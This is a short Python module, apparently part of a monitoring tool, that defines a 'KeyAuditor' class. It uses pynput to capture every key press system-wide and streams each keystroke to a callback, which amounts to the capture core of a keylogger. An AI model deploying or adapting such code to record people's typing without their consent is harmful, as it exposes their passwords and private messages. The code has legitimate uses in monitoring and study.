from pynput import keyboard

class KeyAuditor:
    def __init__(self, callback_func):
        """
        callback_func: Function to call when a key is pressed. 
        Signature: callback(keystring)
        """
        self.callback = callback_func
        self.listener = None

    def start(self):
        if self.listener:
            try:
                self.listener.stop()
            except Exception as e:
                print(f"[-] Failed to stop listener: {e}")
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print("[+] Key Auditor Started")

    def stop(self):
        if self.listener:
            try:
                self.listener.stop()
            except Exception as e:
                print(f"[-] Failed to stop listener: {e}")
            finally:
                self.listener = None

    def on_press(self, key):
        try:
            # Handle Alphanumeric
            k_str = key.char
        except AttributeError:
            # Handle Special Keys
            if key == keyboard.Key.space:
                k_str = " "
            elif key == keyboard.Key.enter:
                k_str = "\n"
            elif key == keyboard.Key.tab:
                k_str = "\t"
            elif key == keyboard.Key.backspace:
                k_str = "[<-]" # Visual backspace
            else:
                k_str = f"[{key.name}]"
        
        # Stream to Viewer
        if self.callback:
            self.callback(k_str)
